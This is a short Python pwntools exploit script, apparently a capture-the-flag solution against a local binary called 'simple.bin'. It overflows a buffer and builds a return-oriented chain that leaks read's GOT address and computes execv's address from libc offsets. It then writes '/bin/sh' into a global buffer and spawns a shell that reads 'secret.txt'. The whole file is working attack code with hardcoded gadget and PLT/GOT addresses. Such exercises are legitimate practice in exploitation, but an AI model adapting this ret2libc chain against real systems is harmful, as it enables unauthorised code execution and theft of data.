#!/usr/bin/python3

from pwn import *


def exploit():
    # Write your exploit logic here.
    p = process("./simple.bin")
    # Investigate the libc library.
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    read_offset = libc.symbols['read']
    execv_offset = libc.symbols['execv']
    offset = read_offset - execv_offset
    read_plt = p64(0x400490)
    read_got = p64(0x601028)
    write_plt = p64(0x400470)
    rdi_gadget = p64(0x400673)
    rsi_gadget = p64(0x400671)
    p.recvline() # write sometimes blah
    payload = b"a"*24 + rdi_gadget + p64(0x1) + rsi_gadget + read_got + p64(0x00) + write_plt # execv의 실질 주소 파악
    payload += rdi_gadget + p64(0x0) + rsi_gadget + p64(0x601080) + p64(0x0) + read_plt + p64(0x4005b6)# gbuf
    p.send(payload)
    sleep(0.5)
    read_addr = u64(p.recv()[0:8]) # write_plt
    execv_addr = read_addr - offset
    p.send(b"/bin/sh\0") #gbuf read_plt
    payload = b"a"*24 + rdi_gadget + p64(0x601080) + rsi_gadget + p64(0x0) + p64(0x0) + p64(execv_addr)
    p.send(payload) #read 144
    #p.send(p64(execv_addr)) #read_plt
    sleep(0.5)
    p.sendline(b"cat secret.txt")
    print(p.recvline())

if __name__ == "__main__":
    exploit()
